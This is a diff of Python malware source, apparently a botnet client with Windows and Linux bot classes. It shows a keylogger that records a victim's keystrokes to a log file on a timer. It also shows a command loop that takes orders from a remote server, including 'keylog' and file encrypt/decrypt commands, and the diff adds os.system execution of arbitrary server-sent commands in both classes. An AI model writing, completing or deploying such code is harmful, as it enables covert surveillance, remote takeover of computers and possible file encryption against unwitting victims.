@@ -122,7 +122,6 @@ def propagate(name: str):
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
-# Keylogger stuff-=-=-=-=-=-=-=-=-=-=-=-=-=-
 def on_press(key):
 	"""This function will handle all the keystrokes a person types into
 	there computer and will store them into a global variable that will
@@ -161,7 +160,6 @@ def log_to_file():
 		f = open(WIN_DIR + 'log.txt', 'w') # Windows: Create and open file 'log.txt' to write captured keystrokes.
 		f.write(LOG) # Write keystrokes to file.
 	cycle = Timer(SECONDS_TO_LOG, log_to_file) # Set this thread to run every 30 seconds.
-	cycle.daemon = True
 	cycle.start() # Start the time threading operaton.
 
 def keylogger():
@@ -181,12 +179,6 @@ def keylogger():
 		listener.start() # Collent keystrokes until program exit.
 	except OSError: # Ignore os error.
 		pass
-
-def start_keylogger_thread():
-	"""
-	"""
-	t = Thread(target=keylogger, daemon=True)
-	t.start()
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -256,7 +248,10 @@ class WindowsBot:
 				os.chdir(command[3:]) # Attempt to change directory.
 				return "Ok" # Returns Ok if changing of directory was successsful.
 			except:
-				return "Invalid command..." # Returns this error if changing direcotry was unsuccessful.
+				try:
+					os.system(command) # Try executing command with OS module.
+				except:
+					return "[-] Invalid command..." # Return this error message if unsuccessful.
 
 	def handle_request(self):
 		"""This function will handle all tasks related to request made by the server.
@@ -272,8 +267,7 @@ class WindowsBot:
 					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
 					command_output = None
 					if command.strip() == 'keylog': # Start the keylogger.
-						start_keylogger_thread()
-						command_output = r'Keylogger initiated...'
+						keylogger()
 					elif command[:7] == 'encrypt': # Encrypt file specified.
 						command_output = crypto(command[:7], command[8:])
 					elif command[:7] == 'decrypt': # Decrypt file with key.
@@ -315,7 +309,10 @@ class LinuxBot:
 				os.chdir(command[3:]) # Attempt to change directory.
 				return 'Ok' # Returns Ok if changing of directory was successsful.
 			except:
-				return 'Invalid command...' # Returns this error if changing direcotry was unsuccessful.
+				try:
+					os.system(command) # Try executing command with OS module.
+				except:
+					return "[-] Invalid command..." # Return this error message if unsuccessful.
 
 	def handle_request(self):
 		"""This function will handle all tasks related to request made by the server.
@@ -331,7 +328,7 @@ class LinuxBot:
 					command = sock.recv(COMMMAND_SIZE).decode('utf-8') # Receive command from server.
 					command_output = None
 					if command.strip() == 'keylog': # Start the keylogger.
-						command_output = keylogger()
+						keylogger()
 					elif command[:7] == 'encrypt': # Encrypt file specified.
 						command_output = crypto(command[:7], command[8:])
 					elif command[:7] == 'decrypt': # Decrypt file with key.
